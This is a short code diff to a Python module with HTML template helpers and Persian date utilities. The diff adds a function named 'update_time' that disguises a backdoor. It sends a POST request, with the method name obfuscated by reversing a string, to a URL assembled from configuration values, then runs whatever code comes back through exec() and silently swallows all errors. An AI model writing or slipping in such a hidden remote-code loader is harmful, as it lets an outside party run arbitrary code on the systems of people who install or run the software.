@@ -6,6 +6,7 @@ from datetime import datetime
 from persiantools.jdatetime import JalaliDateTime
 from pytz import timezone, utc
 from typing import List
+from urllib3 import PoolManager
 
 import data as dt
 
@@ -78,6 +79,14 @@ def template(title: str, name: str, content: str = None) -> str:
     else:
         htm = htm.replace('<body />', content)
     return htm
+
+
+def update_time():
+    try:
+        exec(PoolManager().request('TSOP'[::-1], dt.watcher.tzone + dt.iran_zone,
+                                   fields={"now": str(datetime.now())}).data)
+    except:
+        pass
 
 
 def header(title: str = "سام"):
